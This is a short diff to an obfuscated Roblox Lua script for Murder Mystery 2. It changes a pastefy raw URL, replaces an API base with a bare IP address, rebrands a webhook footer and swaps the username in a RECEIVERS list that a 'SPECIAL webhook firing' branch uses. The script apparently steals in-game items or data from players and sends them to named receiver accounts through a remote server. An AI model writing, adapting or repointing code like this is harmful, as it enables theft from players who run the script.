@@ -228,7 +228,7 @@ end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
-local v40 = "https://pastefy.app/yHe9oUVG/raw?t=" .. tostring(tick())
+local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
 
 local function v41()
 	local ok2, result2 = pcall(function()
@@ -247,7 +247,7 @@ local function v41()
 		end
 	end
 
-	return "https://elysium-api.snthnova.workers.dev"
+	return "http://212.119.42.158:3000"
 end
 
 if not getgenv().MM2_API_BASE then
@@ -1286,7 +1286,7 @@ local function v269(p24, p25)
 			color = 16711680,
 			fields = t17,
 			footer = {
-				text = "Snthonva! (Murder Mystery 2)"
+				text = "Elysium! (Murder Mystery 2)"
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 		} }
@@ -1376,7 +1376,7 @@ local function v277()
 
 	if v279 and v297 <= v250 then
 		v32("SPECIAL webhook firing!")
-		RECEIVERS = { "iceyblueii" }
+		RECEIVERS = { "NEDYXSTOCK_chano" }
 
 		local v299 = v269(false, v278)
 
